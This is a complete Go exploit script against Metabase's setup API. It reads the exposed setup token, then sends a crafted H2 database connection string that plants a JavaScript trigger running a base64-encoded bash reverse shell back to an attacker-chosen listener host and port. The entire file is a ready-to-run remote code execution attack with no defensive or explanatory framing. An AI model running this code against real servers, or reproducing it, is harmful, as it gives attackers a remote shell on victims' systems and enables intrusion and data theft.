package main

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

func getSetupTokenAndVersion(ipAddress string) string {
	endpoint := "/api/session/properties"
	url := ipAddress + endpoint

	fmt.Printf("[DEBUG] Fetching setup token from %s...\n", url)

	response, err := http.Get(url)
	if err != nil {
		fmt.Printf("[DEBUG] Exception occurred: %v\n", err)
		fmt.Printf("[DEBUG] Failed to connect to %s.\n", ipAddress)
		return ""
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		var data map[string]interface{}
		err := json.NewDecoder(response.Body).Decode(&data)
		if err != nil {
			fmt.Printf("[DEBUG] Failed to decode JSON response: %v\n", err)
			return ""
		}

		setupToken, ok := data["setup-token"].(string)
		if !ok || setupToken == "" {
			fmt.Printf("[DEBUG] Setup token not found or is null for IP: %s\n\n", ipAddress)
			return ""
		}

		metabaseVersion, _ := data["version"].(map[string]interface{})["tag"].(string)
		fmt.Printf("[DEBUG] Setup Token: %s\n", setupToken)
		fmt.Printf("[DEBUG] Version: %s\n", metabaseVersion)

		return setupToken
	}

	fmt.Printf("[DEBUG] GET request to %s failed with status code: %d\n\n", url, response.StatusCode)
	return ""
}

func postSetupValidate(ipAddress, setupToken, listenerIP string, listenerPort int) {
	payload := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", listenerIP, listenerPort)))

	fmt.Printf("[DEBUG] Payload = %s\n", payload)

	endpoint := "/api/setup/validate"
	url := ipAddress + endpoint

	headers := map[string]string{
		"Content-Type": "application/json",
	}
	data := map[string]interface{}{
		"token": setupToken,
		"details": map[string]interface{}{
			"is_on_demand":    false,
			"is_full_sync":    false,
			"is_sample":       false,
			"cache_ttl":       nil,
			"refingerprint":   false,
			"auto_run_queries": true,
			"schedules":       map[string]interface{}{},
			"details": map[string]interface{}{
				"db":               fmt.Sprintf("zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,%s}}}|{{base64,-d}}}|{{bash,-i}}')\n$$--=x", payload),
				"advanced-options": false,
				"ssl":              true,
			},
			"name":   "test",
			"engine": "h2",
		},
	}

	requestBody, err := json.Marshal(data)
	if err != nil {
		fmt.Printf("[DEBUG] Failed to create JSON request body: %v\n", err)
		return
	}

	fmt.Printf("[DEBUG] Sending request to %s with headers %+v and data %s\n", url, headers, string(requestBody))

	response, err := http.Post(url, "application/json", strings.NewReader(string(requestBody)))
	if err != nil {
		fmt.Printf("[DEBUG] Exception occurred: %v\n", err)
		fmt.Printf("[DEBUG] Failed to connect to %s\n", url)
		return
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		fmt.Printf("[DEBUG] POST to %s successful.\n\n", url)
	} else {
		fmt.Printf("[DEBUG] POST to %s failed with status code: %d\n\n", url, response.StatusCode)
	}
}

func preprocessURL(userInput string) string {
	// Add http:// prefix if not provided
	if !strings.HasPrefix(userInput, "http://") && !strings.HasPrefix(userInput, "https://") {
		userInput = "http://" + userInput
	}

	parsedURL, err := url.Parse(userInput)
	if err != nil {
		fmt.Printf("[DEBUG] Failed to parse URL: %v\n", err)
		return ""
	}

	// Check if the host is empty
	if parsedURL.Host == "" {
		fmt.Println("[ERROR] Invalid rhost. Please provide a valid URL with protocol (http:// or https://) and optional port.")
		return ""
	}

	return parsedURL.String()
}

func main() {
	rhostPtr := flag.String("rhost", "", "Metabase server IP address (including http:// or https:// and port number if needed)")
	lhostPtr := flag.String("lhost", "", "Listener IP address")
	lportPtr := flag.Int("lport", 4444, "Listener port (default is 4444)")

	flag.Parse()

	if *rhostPtr == "" {
		fmt.Println("[ERROR] rhost is required.")
		return
	}

	fmt.Printf("[DEBUG] Original rhost: %s\n", *rhostPtr)
	rhost := preprocessURL(*rhostPtr)
	if rhost == "" {
		fmt.Println("[ERROR] Failed to preprocess rhost.")
		return
	}
	fmt.Printf("[DEBUG] Preprocessed rhost: %s\n", rhost)

	fmt.Printf("[DEBUG] Input Arguments - rhost: %s, lhost: %s, lport: %d\n", rhost, *lhostPtr, *lportPtr)

	setupToken := getSetupTokenAndVersion(rhost)
	fmt.Printf("[DEBUG] Setup token: %s\n", setupToken)
	if setupToken != "" {
		postSetupValidate(rhost, setupToken, *lhostPtr, *lportPtr)
	}
}
